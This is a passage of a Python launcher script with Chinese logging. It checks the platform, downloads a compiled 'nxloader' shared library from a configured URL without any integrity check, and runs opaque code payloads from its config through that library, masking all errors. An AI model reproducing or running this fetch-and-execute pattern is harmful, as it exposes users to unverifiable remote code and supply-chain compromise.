            return await func(*args, **kwargs)
        except Exception as e:
            # 异常消息可能是 loader 透传的 "…[类名]"，打印类名便于定位
            logger.error(f"脚本无法正常运行，请检测更换环境 [{type(e).__name__}]")
            sys.exit(1)
    return wrapper

def get_linux_distro() -> Tuple[str, str]:
    try:
        with open('/etc/os-release') as f:
            info = {k: v.strip('"') for line in f if '=' in line for k, v in [line.strip().split('=', 1)]}
            return info.get('NAME', 'Unknown'), info.get('VERSION_ID', '')
    except FileNotFoundError:
        return "Not Linux", ""

# --- Core Classes ---

class EnvironmentChecker:
    """环境检查类"""
    def __init__(self, config: Config):
        self.config = config

    @handle_errors
    async def check_system(self) -> Optional[Dict[str, str]]:
        v = sys.version_info
        os_type = platform.system()
        arch = platform.machine()

        system_info = {
            "python_version": f"{v.major}.{v.minor}.{v.micro}",
            "os_type": os_type,
            "architecture": arch
        }
        logger.info(
            f"系统信息: Python版本={system_info['python_version']}, "
            f"操作系统={system_info['os_type']}, 处理器架构={system_info['architecture']}"
        )

        if v.minor not in self.config.SUPPORTED_PYTHON_VERSIONS:
            logger.error("脚本无法正常运行，请检测更换环境")
            return None

        if os_type != self.config.SUPPORTED_OS:
            logger.error("脚本无法正常运行，请检测更换环境")
            return None

        if arch not in self.config.SUPPORTED_ARCHITECTURES:
            logger.error("脚本无法正常运行，请检测更换环境")
            return None

        if arch in {'armv8', 'armv7l'}:
            logger.info("ARMv7, ARMv8请自行尝试")

        return system_info

class FileManager:
    """文件管理类"""
    def __init__(self, config: Config):
        self.config = config

    def get_so_filename(self, py_minor_version: int, cpu_info: str) -> str:
        base_name = "nxloader"
        if cpu_info in ['aarch64', 'armv8']:
            arch = 'aarch64'
        elif cpu_info == 'x86_64':
            arch = cpu_info
        elif 'armv7' in cpu_info:
            arch = 'armv7'
        else:
            raise ValueError(f"不支持的CPU架构: {cpu_info}")

        distro, _ = get_linux_distro()
        if "alpine" in distro.lower():
            return f"{base_name}_3{py_minor_version}_{arch}_musl.so"
        return f"{base_name}_3{py_minor_version}_{arch}.so"

    @handle_errors
    async def download_file(self, filename: str, target: str = 'nxloader.so') -> bool:
        url = f"{self.config.download_url()}/{filename}"
        logger.info(f"开始下载固定 so: {url}")

        def _fetch():
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=60) as r:
                if r.status != 200:
                    raise RuntimeError(f"HTTP {r.status}")
                return r.read()

        try:
            data = await asyncio.get_running_loop().run_in_executor(None, _fetch)
        except Exception:
            logger.error("脚本无法正常运行，请检测更换环境")
            try:
                if os.path.exists(target):
                    os.remove(target)
            except Exception:
                pass
            return False
        with open(target, 'wb') as f:
            f.write(data)
        logger.info(f"so 下载完成: {target}")
        return True

# --- Execution Logic ---

@handle_errors
async def execute_code(config: Config):
    import nxloader
    py_version_str = nxloader.get_python_version()
    loader_version = nxloader.version
    logging.info(f"当前loaderV2版本: {loader_version}")
    if hasattr(nxloader, "set_script"):
        nxloader.set_script(config.SCRIPT_NAME)
    code_to_run = (config.CODE_PAYLOADS.get(py_version_str)
                   or config.CODE_PAYLOADS.get("3.0"))
    if not code_to_run:
        logger.error("脚本无法正常运行，请检测更换环境")
        return
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        None, lambda: nxloader.main(code_to_run, config.FUNCTION_NAME))
    if hasattr(result, '__await__'):
        await result
    logging.info("代码执行完毕")

async def ensure_loader(config, file_manager) -> bool:
    """本地 so 存在且版本达标则直接用；否则下载新版并热替换。"""
    local = 'nxloader.so'
    if os.path.exists(local):
        try:
            mod = _load_so(local)
            if _ver_ok(getattr(mod, 'version', '0')):
                logger.info(f"本地 loader 版本 {mod.version}（要求 >= {MIN_LOADER_VERSION}）")
                return True
            logger.info(f"本地 loader {getattr(mod, 'version', '?')} 过旧，准备更新到 {MIN_LOADER_VERSION}")
        except Exception:
            logger.info("本地 loader 不可用，准备重新下载")
    filename = file_manager.get_so_filename(sys.version_info.minor, platform.machine())
    tmp = f".nxloader_{MIN_LOADER_VERSION}_{os.getpid()}.so"
    if not await file_manager.download_file(filename, tmp):
        return False
    try:
        mod = _load_so(tmp)
        if not _ver_ok(getattr(mod, 'version', '0')):
            logger.error("脚本无法正常运行，请检测更换环境")
            return False
    except Exception:
        logger.error("脚本无法正常运行，请检测更换环境")
        return False
    try:
        os.replace(tmp, local)      # 下次启动直接命中新版
    except Exception:
        pass
    logger.info(f"loader 已更新: {getattr(mod, 'version', '?')}")
    return True


@handle_errors
async def main():
    config = Config()
    checker = EnvironmentChecker(config)
    file_manager = FileManager(config)

    system_info = await checker.check_system()
    if not system_info:
        return

    if not await ensure_loader(config, file_manager):
        return
    await execute_code(config)

if __name__ == '__main__':
    asyncio.run(main())
